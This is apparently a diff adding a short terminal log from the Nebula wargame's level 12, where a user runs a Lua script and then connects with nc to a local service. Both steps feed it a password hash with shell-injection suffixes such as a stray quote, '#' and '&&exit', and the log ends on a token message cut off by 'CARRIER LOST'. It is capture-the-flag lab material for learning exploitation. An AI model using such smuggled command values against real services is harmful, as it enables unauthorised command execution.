@@ -1,0 +1,13 @@
+level12@nebula:~$ lua flag12.lua 
+trying 4754a4f4bd5787accd33de887b9250a0691dd198"#
+sh: -c: line 0: unexpected EOF while looking for matching `"'
+sh: -c: line 1: syntax error: unexpected end of file
+trying 4754a4f4bd5787accd33de887b9250a0691dd198#
+trying 4754a4f4bd5787accd33de887b9250a0691dd198&&exit
+^C 
+^C
+level12@nebula:~$ ^C
+level12@nebula:~$ nc localhost 50001
+Password: 4754a4f4bd5787accd33de887b9250a0691dd198&&exit
+Congrats, your token is 413**CARRIER LOST**
+
